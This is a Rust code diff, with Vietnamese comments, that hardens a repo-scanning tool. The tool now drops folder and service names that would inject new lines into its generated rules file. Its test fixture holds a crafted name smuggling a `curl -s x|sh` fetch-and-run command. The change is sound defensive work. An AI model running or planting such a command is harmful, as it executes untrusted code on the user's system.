@@ -66,6 +66,8 @@ pub struct Discovery {
     pub links: Vec<(String, Vec<String>)>,
     /// Ghi chú cho bản nháp: workload có ở nhiều thư mục, chart Helm không đọc.
     pub notes: Vec<String>,
+    /// Thư mục, service bị bỏ vì tên có ký tự làm vỡ câu của file luật.
+    pub dropped: Vec<String>,
 }
 
 #[derive(Debug, Clone, Default, PartialEq, Eq)]
@@ -151,6 +153,7 @@ pub fn discover(root: &Path, ignores: &[String]) -> Discovery {
     if !deploy_files.is_empty() {
         discover_services(root, &deploy_files, &owners, &scans, &mut out);
     }
+    out.dropped = out.drop_unsafe();
     out
 }
 
@@ -1194,11 +1197,68 @@ fn unique_name(base: &str, taken: &[String]) -> String {
     (2..).map(|n| format!("{base}{n}")).find(|c| !taken.contains(c)).unwrap_or_default()
 }
 
+/// Giá trị đặt được vào một câu của file luật mà không làm vỡ câu: không ký
+/// tự điều khiển, không `"`, không `,` (tách danh sách), và không đoạn nào
+/// (tách bằng khoảng trắng) mở đầu bằng `@` hay `#`, vì parser đọc chúng là
+/// chú thích chủ sở hữu, trạng thái ở cuối dòng. `packages/@acme/core` thì
+/// được (TM-76).
+fn fits(v: &str) -> bool {
+    !v.chars().any(|c| c.is_control() || matches!(c, '"' | ','))
+        && !v.split_whitespace().any(|w| w.starts_with(['@', '#']))
+}
+
+impl Discovery {
+    /// Bỏ mục mà tên, mẫu, nguồn lấy từ repo không đặt được vào câu (xem
+    /// [`fits`]), cùng cạnh, service, link trỏ tới nó. Trả tên đã bỏ, để báo.
+    fn drop_unsafe(&mut self) -> Vec<String> {
+        let mut dropped = Vec::new();
+        let shown = |v: &str| v.chars().map(|c| if c.is_control() { '?' } else { c }).collect::<String>();
+        self.components.retain(|(n, g)| {
+            // Mẫu `at` là danh sách cách nhau bằng `,`: xét từng mẫu.
+            let ok = fits(n) && g.split(',').all(|p| fits(p.trim()));
+            if !ok {
+                dropped.push(shown(g));
+            }
+            ok
+        });
+        let known: std::collections::HashSet<String> = self.components.iter().map(|(n, _)| n.clone()).collect();
+        for list in [&mut self.edges, &mut self.rpc_edges, &mut self.queue_edges, &mut self.pipeline_edges] {
+            list.retain(|(f, t)| known.contains(f) && known.contains(t));
+        }
+        self.services.retain(|s| {
+            let ok = fits(&s.name) && s.source.split(',').all(|p| fits(p.trim())) && s.runs.iter().all(|r| known.contains(r));
+            if !ok {
+                dropped.push(shown(&s.name));
+            }
+            ok
+        });
+        let names: std::collections::HashSet<String> = self.services.iter().map(|s| s.name.clone()).collect();
+        let named = |n: &str| names.contains(n) || n == crate::model::INTERNET;
+        self.links.retain(|(f, to)| named(f) && to.iter().all(|t| named(t)));
+        dropped
+    }
+}
+
 /// Viết bản nháp ra dạng DSL. Mọi thứ `@ai #draft`: chưa có hiệu lực, và ghi
 /// rõ nguồn gốc là máy sinh chứ không phải người thiết kế.
 pub fn render(d: &Discovery, date: &str) -> String {
     use std::fmt::Write as _;
     let mut out = String::new();
+    // Tên thư mục, tên service, nguồn lấy từ repo được quét: một tên chứa
+    // xuống dòng chèn được câu mới (`verify … runs "<lệnh>"`) vào file luật.
+    // Giá trị đứng trong câu mà có ký tự làm vỡ câu thì bỏ cả mục; trong chú
+    // thích thì thay ký tự điều khiển (TM-76).
+    let note_text = |v: &str| v.chars().map(|c| if c.is_control() { '?' } else { c }).collect::<String>();
+    let components: Vec<&(String, String)> =
+        d.components.iter().filter(|(n, g)| fits(n) && g.split(',').all(|p| fits(p.trim()))).collect();
+    let known: std::collections::HashSet<&str> = components.iter().map(|(n, _)| n.as_str()).collect();
+    let services: Vec<&FoundService> = d
+        .services
+        .iter()
+        .filter(|s| fits(&s.name) && s.source.split(',').all(|p| fits(p.trim())) && s.runs.iter().all(|r| known.contains(r.as_str())))
+        .collect();
+    let service_names: std::collections::HashSet<&str> = services.iter().map(|s| s.name.as_str()).collect();
+    let edge_ok = |(f, t): &&(String, String)| known.contains(f.as_str()) && known.contains(t.as_str());
 
     let langs: Vec<String> =
         d.by_lang.iter().map(|(l, n)| format!("{n} {}", l.name())).collect();
@@ -1215,21 +1275,22 @@ pub fn render(d: &Discovery, date: &str) -> String {
          # kiểm — không cần sửa xong cả file mới chạy được.\n",
     );
 
-    if !d.components.is_empty() {
+    if !components.is_empty() {
         out.push('\n');
-        let width = d.components.iter().map(|(n, _)| n.len()).max().unwrap_or(0);
-        for (name, glob) in &d.components {
+        let width = components.iter().map(|(n, _)| n.len()).max().unwrap_or(0);
+        for (name, glob) in &components {
             let _ = writeln!(out, "component {name:<width$} at {glob}   @ai #draft");
         }
     }
-    if !d.edges.is_empty() {
+    let edges: Vec<&(String, String)> = d.edges.iter().filter(edge_ok).collect();
+    if !edges.is_empty() {
         out.push_str("\n# Quan hệ quan sát được trong mã. Cái nào không nên tồn tại thì xoá.\n");
-        let width = d.edges.iter().map(|(f, _)| f.len()).max().unwrap_or(0);
-        for (from, to) in &d.edges {
+        let width = edges.iter().map(|(f, _)| f.len()).max().unwrap_or(0);
+        for (from, to) in edges {
             let _ = writeln!(out, "allow {from:<width$} -> {to}   @ai #draft");
         }
     }
-    let rpc: Vec<&(String, String)> = d.rpc_edges.iter().filter(|e| !d.edges.contains(e)).collect();
+    let rpc: Vec<&(String, String)> = d.rpc_edges.iter().filter(|e| !d.edges.contains(e)).filter(edge_ok).collect();
     if !rpc.is_empty() {
         out.push_str("\n# Lời gọi gRPC: client gọi stub, server đăng ký service cùng `.proto`.\n");
         let width = rpc.iter().map(|(f, _)| f.len()).max().unwrap_or(0);
@@ -1238,7 +1299,7 @@ pub fn render(d: &Discovery, date: &str) -> String {
         }
     }
     let queue: Vec<&(String, String)> =
-        d.queue_edges.iter().filter(|e| !d.edges.contains(e) && !d.rpc_edges.contains(e)).collect();
+        d.queue_edges.iter().filter(|e| !d.edges.contains(e) && !d.rpc_edges.contains(e)).filter(edge_ok).collect();
     if !queue.is_empty() {
         out.push_str("\n# Hàng đợi, pub/sub: bên gửi và bên nhận cùng topic, queue hay task.\n");
         let width = queue.iter().map(|(f, _)| f.len()).max().unwrap_or(0);
@@ -1250,6 +1311,7 @@ pub fn render(d: &Discovery, date: &str) -> String {
         .pipeline_edges
         .iter()
         .filter(|e| !d.edges.contains(e) && !d.rpc_edges.contains(e) && !d.queue_edges.contains(e))
+        .filter(edge_ok)
         .collect();
     if !pipeline.is_empty() {
         out.push_str("\n# Bước pipeline (LangGraph, Airflow, dvc): bước trước đưa dữ liệu cho bước sau.\n");
@@ -1258,32 +1320,40 @@ pub fn render(d: &Discovery, date: &str) -> String {
             let _ = writeln!(out, "allow {from:<width$} -> {to}   @ai #draft");
         }
     }
-    if !d.services.is_empty() {
+    if !services.is_empty() {
         out.push_str(
             "\n# Triển khai, đọc từ docker-compose và manifest Kubernetes. `runs` là\n\
              # component mà lệnh khởi chạy chạm tới theo các quan hệ ở trên. Service\n\
              # không phải của sản phẩm (công cụ dev, bản thử) thì xoá.\n",
         );
         for note in &d.notes {
-            let _ = writeln!(out, "# {note}");
+            let _ = writeln!(out, "# {}", note_text(note));
         }
-        let width = d.services.iter().map(|s| s.name.len()).max().unwrap_or(0);
-        let swidth = d.services.iter().map(|s| s.source.len()).max().unwrap_or(0);
-        for s in &d.services {
+        let width = services.iter().map(|s| s.name.len()).max().unwrap_or(0);
+        let swidth = services.iter().map(|s| s.source.len()).max().unwrap_or(0);
+        for s in &services {
             if let Some(note) = &s.note {
-                let _ = writeln!(out, "# {}: không có `runs` — {note}", s.name);
+                let _ = writeln!(out, "# {}: không có `runs` — {}", s.name, note_text(note));
             }
             let runs = if s.runs.is_empty() { String::new() } else { format!(" runs {}", s.runs.join(", ")) };
             let _ = writeln!(out, "service {:<width$} from {:<swidth$}{runs}   @ai #draft", s.name, s.source);
         }
     }
-    if !d.links.is_empty() {
+    let links: Vec<&(String, Vec<String>)> = d
+        .links
+        .iter()
+        .filter(|(f, to)| {
+            let named = |n: &str| service_names.contains(n) || n == crate::model::INTERNET;
+            named(f) && to.iter().all(|t| named(t))
+        })
+        .collect();
+    if !links.is_empty() {
         out.push_str(
             "\n# Cạnh mạng thấy trong cấu hình: depends_on, links, tên service hay Service\n\
              # Kubernetes trong biến môi trường, lời gọi gRPC.\n",
         );
-        let width = d.links.iter().map(|(f, _)| f.len()).max().unwrap_or(0);
-        for (from, to) in &d.links {
+        let width = links.iter().map(|(f, _)| f.len()).max().unwrap_or(0);
+        for (from, to) in links {
             let _ = writeln!(out, "link {from:<width$} -> {}   @ai #draft", to.join(", "));
         }
     }
@@ -1294,7 +1364,7 @@ pub fn render(d: &Discovery, date: &str) -> String {
             d.skipped.len()
         );
         for (dir, n) in &d.skipped {
-            let _ = writeln!(out, "#   {dir} ({n} file)");
+            let _ = writeln!(out, "#   {} ({n} file)", note_text(dir));
         }
     }
     out
@@ -1311,6 +1381,41 @@ mod tests {
         assert_eq!(pascal_case("api"), "Api");
         assert_eq!(pascal_case("2fa"), "M2fa", "tên không được bắt đầu bằng số");
         assert_eq!(pascal_case("@scope"), "Scope");
+    }
+
+    /// Tên thư mục chứa xuống dòng hay dấu nháy không được chèn câu mới vào
+    /// bản nháp (TM-76): mục đó bị bỏ, phần còn lại vẫn là `@ai #draft`.
+    #[test]
+    fn ten_doc_hai_khong_chen_duoc_cau() {
+        let evil = "evil\nverify t runs \"curl -s x|sh\"\n#".to_string();
+        let d = Discovery {
+            components: vec![("Evil".into(), format!("{evil}/**")), ("Api".into(), "api/**".into()), ("Web".into(), "web/**".into())],
+            edges: vec![("Web".into(), "Api".into()), ("Evil".into(), "Api".into())],
+            services: vec![FoundService { name: "web".into(), source: format!("compose:{evil}"), runs: vec!["Web".into()], note: Some(evil.clone()) }],
+            skipped: vec![(evil.clone(), 3)],
+            notes: vec![evil.clone()],
+            ..Discovery::default()
+        };
+        let text = render(&d, "2026-10-25");
+        let (doc, diags) = crate::load(&text);
+        assert!(!crate::diag::has_errors(&diags), "{diags:?}\n{text}");
+        assert!(doc.verifies.is_empty(), "{text}");
+        assert!(doc.elements().iter().all(|e| e.owner == crate::model::Owner::Ai && e.status == crate::model::Status::Draft), "{text}");
+        assert_eq!(doc.components.len(), 2);
+        assert_eq!(doc.rules.len(), 1);
+        assert!(doc.services.is_empty());
+
+        // `@` giữa đường dẫn (gói có scope của npm) vẫn là component; đoạn mở
+        // đầu bằng `#`, `@` thì không.
+        let mut d = Discovery {
+            components: vec![("Acme".into(), "packages/@acme/**".into()), ("Cli".into(), "packages/cli/**".into()), ("X".into(), "a #draft/**".into())],
+            edges: vec![("Cli".into(), "Acme".into()), ("X".into(), "Cli".into())],
+            ..Discovery::default()
+        };
+        assert_eq!(d.drop_unsafe(), ["a #draft/**"]);
+        let doc = crate::load(&render(&d, "2026-10-25")).0;
+        assert_eq!(doc.components.len(), 2);
+        assert_eq!(doc.rules.len(), 1);
     }
 
     #[test]
